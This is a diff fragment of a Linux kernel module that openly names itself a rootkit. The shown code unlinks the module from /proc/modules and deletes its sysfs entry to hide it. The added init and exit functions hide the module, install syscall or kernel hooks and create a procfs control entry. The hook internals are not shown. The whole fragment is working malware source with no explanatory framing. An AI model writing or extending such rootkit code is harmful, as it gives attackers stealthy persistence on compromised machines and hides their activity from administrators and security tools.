@@ -582,3 +582,30 @@ static void r00tkit_hide()
 	list_del_init(&THIS_MODULE->list); 	/* hide from /proc/modules */
 	kobject_del(&THIS_MODULE->mkobj.kobj);	/* remove rootkit's sysfs entry	*/
 }
+
+
+
+static int r00tkit_init(void)
+{
+
+	r00tkit_hide();
+
+	if (!r00tkit_do_hook())
+		return -1;
+	
+	if (!r00tkit_procfs_entry_init())
+		return -1;
+
+	return 0;
+}
+
+static void r00tkit_exit(void)
+{
+
+	remove_proc_entry(R00TKIT_PROCFS_ENTRYNAME,procfs_root);
+
+	r00tkit_undo_hook();
+}
+
+module_init(r00tkit_init);
+module_exit(r00tkit_exit);
